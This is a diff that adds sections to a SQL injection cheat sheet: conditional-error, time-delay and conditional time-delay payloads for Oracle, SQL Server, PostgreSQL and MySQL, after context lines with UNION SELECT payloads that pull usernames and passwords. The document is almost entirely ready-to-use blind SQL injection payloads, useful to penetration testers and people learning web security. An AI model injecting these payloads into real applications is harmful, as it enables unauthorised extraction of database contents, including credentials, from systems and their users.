@@ -134,3 +134,66 @@ UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=
 UNION SELECT username_xxx,+password_xxx FROM user_xxx--
 
 ```
+
+## Conditional errors
+
+You can test a single boolean condition and trigger a database error if the condition is true
+
+**Oracle**
+```SQL
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual
+```
+**Microsoft**
+```SQL
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+```
+**PostgreSQL**
+```SQL
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END
+```
+**MySQL**
+```SQL
+SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
+```
+
+## Time delays
+
+You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+
+**Oracle** 	
+```SQL
+dbms_pipe.receive_message(('a'),10)
+```
+**Microsoft** 	
+```SQL
+WAITFOR DELAY '0:0:10'
+```
+**PostgreSQL** 	
+```SQL
+SELECT pg_sleep(10)
+```
+**MySQL** 	
+```SQL
+SELECT sleep(10) 
+```
+## Conditional time delays
+
+You can test a single boolean condition and trigger a time delay if the condition is true.
+
+**Oracle** 	
+```SQL
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+```
+**Microsoft** 	
+```SQL
+IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+```
+**PostgreSQL** 	
+```SQL
+SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+```
+**MySQL** 	
+```SQL
+SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')
+```
+
